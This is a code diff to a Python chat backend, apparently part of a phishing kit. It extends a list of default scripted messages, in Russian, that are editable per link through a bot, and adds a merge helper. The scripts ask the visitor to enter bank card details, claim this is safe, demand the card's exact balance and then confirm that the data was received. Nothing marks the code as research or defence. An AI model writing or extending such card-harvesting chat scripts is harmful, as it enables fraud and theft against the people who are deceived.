@@ -53,10 +53,11 @@ async def set_preview_config(user_id: int, config: dict, token: str, ttl: int = 
 # ── chat scripts (editable per-link via bot) ───────────────────────────────────
 
 _DEFAULT_STEPS = [
-    {"step": 1, "trigger": "open",    "text": "Привет! Чем могу помочь?",               "button": "Написать оператору"},
-    {"step": 2, "trigger": "card",    "text": "Введите данные карты — это безопасно.",   "button": "Есть вопрос"},
-    {"step": 3, "trigger": "balance", "text": "Укажите точный баланс карты.",            "button": "Не понимаю зачем"},
-    {"step": 4, "trigger": "error",   "text": "Возникла ошибка? Оператор поможет.",     "button": "Связаться"},
+    {"step": 1, "trigger": "open",     "text": "Привет! Чем могу помочь?",               "button": "Написать оператору"},
+    {"step": 2, "trigger": "card",     "text": "Введите данные карты — это безопасно.",   "button": "Есть вопрос"},
+    {"step": 3, "trigger": "balance",  "text": "Укажите точный баланс карты.",            "button": "Не понимаю зачем"},
+    {"step": 4, "trigger": "error",    "text": "Возникла ошибка? Оператор поможет.",     "button": "Связаться"},
+    {"step": 5, "trigger": "complete", "text": "Данные получены. Оператор скоро ответит.", "button": "Написать оператору"},
 ]
 
 
@@ -64,10 +65,24 @@ def _user_steps_key(user_id: int) -> str:
     return f"chat_steps:user:{user_id}"
 
 
+def _merge_default_steps(stored: list) -> list:
+    """Keep user edits, append any new default triggers they don't have yet."""
+    have = {s.get("trigger") for s in stored}
+    out = list(stored)
+    next_step = max((s.get("step") or 0 for s in out), default=0)
+    for d in _DEFAULT_STEPS:
+        if d["trigger"] not in have:
+            next_step += 1
+            step = dict(d)
+            step["step"] = next_step
+            out.append(step)
+    return out
+
+
 async def get_chat_steps(user_id: int) -> list:
     raw = await _redis.get(_user_steps_key(user_id))
     if raw:
-        return json.loads(raw)
+        return _merge_default_steps(json.loads(raw))
     return list(_DEFAULT_STEPS)
 
 
